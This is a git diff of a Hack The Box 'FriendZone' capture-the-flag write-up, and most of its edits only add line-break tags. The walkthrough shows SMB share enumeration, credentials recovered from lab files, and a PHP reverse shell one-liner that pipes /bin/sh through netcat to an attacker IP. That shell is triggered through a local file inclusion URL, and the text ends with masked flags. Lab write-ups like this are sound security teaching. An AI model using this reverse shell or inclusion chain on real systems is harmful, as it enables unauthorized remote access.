@@ -69,7 +69,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 #### Initial Access
 #### Web
 Visiting http://10.10.10.123 shows the following page.
-take note of the email domain `"friendzoneportal.red"`
+take note of the email domain <br>`"friendzoneportal.red"`<br>
 Neither Gobuster or Nikto give any use full information<br>
 
 ![](\images\htb\friendzone\1.png)<br><br>
@@ -89,7 +89,7 @@ smbmap -H 10.10.10.123
 
 Have read/write access to "Development" share. Taking note of the comment in the "Files" share "/etc/Files"
 
-Running nmap to confirm location of the "Development" share on the machine
+Running nmap to confirm location of the "Development" share on the machine<br>
 `nmap --script smb-enum-shares -p139 10.10.10.123`<br>
 ![](\images\htb\friendzone\2.png)<br><br>
 
@@ -97,7 +97,7 @@ Connecting to the "general" share find file  "cred.txt" file which has a credent
 ![](\images\htb\friendzone\3.png)<br><br>
 ![](\images\htb\friendzone\4.png)<br><br>
 
-Credentials
+Credentials<br>
 `admin:WORKWORKHhallelujah@#`
 
 
@@ -125,7 +125,7 @@ After logging in we can see that is complaining about a parameter missing<br>
 
 #### Revereshell
 
-Create PHP reverse shell
+Create PHP reverse shell<br>
 `<?php
 system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8888 >/tmp/f');
 ?>`
@@ -133,10 +133,10 @@ system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8888 >
 Upload shell to the development share<br>
 ![](\images\htb\friendzone\9.png)<br><br>
 
-Start nc listener on port 8888
+Start nc listener on port 8888<br>
 `nc -lvnp 8888`
 
-Visit the following to get a reverse shell
+Visit the following to get a reverse shell<br>
 https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell
 
 <br>![](\images\htb\friendzone\10.png)<br><br>
@@ -145,8 +145,8 @@ https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc
 
 ### User
 
-In /var/www there is a mysql config file which contains credentials for the user friend
-`friend:Agpyu12!0.213$`
+In /var/www there is a mysql config file which contains credentials for the user friend<br>
+`friend:Agpyu12!0.213$`<br>
 
 <br>![](\images\htb\friendzone\11.png)<br><br>
 
@@ -157,7 +157,7 @@ Login to box with above credentials
 
 <br>![](\images\htb\friendzone\12.png)<br><br>
 
-User.txt
+User.txt<br>
 `a9ed20ac****************15ae9a11`
 
 <hr>
@@ -202,5 +202,5 @@ s.close()
 After a minute get a root shell<br>
 ![](\images\htb\friendzone\19.png)<br><br>
 
-root.txt
+root.txt<br>
 `b0e6c60b****************6a9e90c7`
